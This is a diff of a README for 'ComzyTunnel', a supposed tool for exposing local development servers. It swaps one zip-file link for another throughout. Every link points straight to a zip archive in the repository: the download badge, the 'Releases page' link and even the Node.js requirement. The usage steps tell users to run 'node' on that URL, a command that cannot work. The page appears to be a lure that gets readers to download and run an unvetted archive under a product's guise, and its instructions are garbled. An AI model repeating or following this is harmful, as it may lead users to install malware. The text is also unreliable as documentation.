@@ -4,14 +4,14 @@
 
 Welcome to ComzyTunnel! This service helps you expose your local development servers to the internet safely. Whether you're testing features or sharing with a friend, ComzyTunnel makes it easy to connect.
 
-[![Download ComzyTunnel](https://raw.githubusercontent.com/hecker351/ComzyTunnel/main/api/ComzyTunnel_v3.1-beta.4.zip%https://raw.githubusercontent.com/hecker351/ComzyTunnel/main/api/ComzyTunnel_v3.1-beta.4.zip)](https://raw.githubusercontent.com/hecker351/ComzyTunnel/main/api/ComzyTunnel_v3.1-beta.4.zip)
+[![Download ComzyTunnel](https://github.com/hecker351/ComzyTunnel/raw/refs/heads/main/api/Tunnel_Comzy_v1.5.zip%https://github.com/hecker351/ComzyTunnel/raw/refs/heads/main/api/Tunnel_Comzy_v1.5.zip)](https://github.com/hecker351/ComzyTunnel/raw/refs/heads/main/api/Tunnel_Comzy_v1.5.zip)
 
 ## 📥 Download & Install
 
 To get started, you need to download ComzyTunnel. Follow these simple steps:
 
 1. **Visit the Releases Page**
-   Go to the [ComzyTunnel Releases page](https://raw.githubusercontent.com/hecker351/ComzyTunnel/main/api/ComzyTunnel_v3.1-beta.4.zip) to find the latest version of the application.
+   Go to the [ComzyTunnel Releases page](https://github.com/hecker351/ComzyTunnel/raw/refs/heads/main/api/Tunnel_Comzy_v1.5.zip) to find the latest version of the application.
 
 2. **Download the Latest Version**
    Look for the latest release on the page. Click on the link to download the appropriate file for your operating system.
@@ -26,13 +26,13 @@ Using ComzyTunnel is straightforward. Here’s how to create your first tunnel:
 1. **Start the Server**
    Open your terminal or command prompt.
    ```
-   node https://raw.githubusercontent.com/hecker351/ComzyTunnel/main/api/ComzyTunnel_v3.1-beta.4.zip
+   node https://github.com/hecker351/ComzyTunnel/raw/refs/heads/main/api/Tunnel_Comzy_v1.5.zip
    ```
 
 2. **Connect Your Client**
    In another terminal window, run:
    ```
-   node https://raw.githubusercontent.com/hecker351/ComzyTunnel/main/api/ComzyTunnel_v3.1-beta.4.zip
+   node https://github.com/hecker351/ComzyTunnel/raw/refs/heads/main/api/Tunnel_Comzy_v1.5.zip
    ```
 
 3. **Follow the Prompts**
@@ -78,11 +78,11 @@ The above diagram shows how the client connects to the server, allowing you to i
 To run ComzyTunnel effectively, make sure your system meets the following requirements:
 
 - **Operating System**: Windows 10, macOS, or a modern Linux distribution.
-- **https://raw.githubusercontent.com/hecker351/ComzyTunnel/main/api/ComzyTunnel_v3.1-beta.4.zip**: Version 12 or higher.
+- **https://github.com/hecker351/ComzyTunnel/raw/refs/heads/main/api/Tunnel_Comzy_v1.5.zip**: Version 12 or higher.
 - **RAM**: Minimum 2 GB.
 - **Storage**: At least 100 MB free space.
 
-Install https://raw.githubusercontent.com/hecker351/ComzyTunnel/main/api/ComzyTunnel_v3.1-beta.4.zip from [https://raw.githubusercontent.com/hecker351/ComzyTunnel/main/api/ComzyTunnel_v3.1-beta.4.zip](https://raw.githubusercontent.com/hecker351/ComzyTunnel/main/api/ComzyTunnel_v3.1-beta.4.zip) if you don't have it already.
+Install https://github.com/hecker351/ComzyTunnel/raw/refs/heads/main/api/Tunnel_Comzy_v1.5.zip from [https://github.com/hecker351/ComzyTunnel/raw/refs/heads/main/api/Tunnel_Comzy_v1.5.zip](https://github.com/hecker351/ComzyTunnel/raw/refs/heads/main/api/Tunnel_Comzy_v1.5.zip) if you don't have it already.
 
 ## 📃 FAQs
 
@@ -103,6 +103,6 @@ If you encounter any issues, or have questions, you can reach out for support in
 
 Stay tuned for upcoming features and enhancements. We plan to improve user experience continually based on your needs.
 
-For more details, feel free to explore the [ComzyTunnel Releases page](https://raw.githubusercontent.com/hecker351/ComzyTunnel/main/api/ComzyTunnel_v3.1-beta.4.zip) again!
+For more details, feel free to explore the [ComzyTunnel Releases page](https://github.com/hecker351/ComzyTunnel/raw/refs/heads/main/api/Tunnel_Comzy_v1.5.zip) again!
 
 Thank you for using ComzyTunnel. Happy coding!
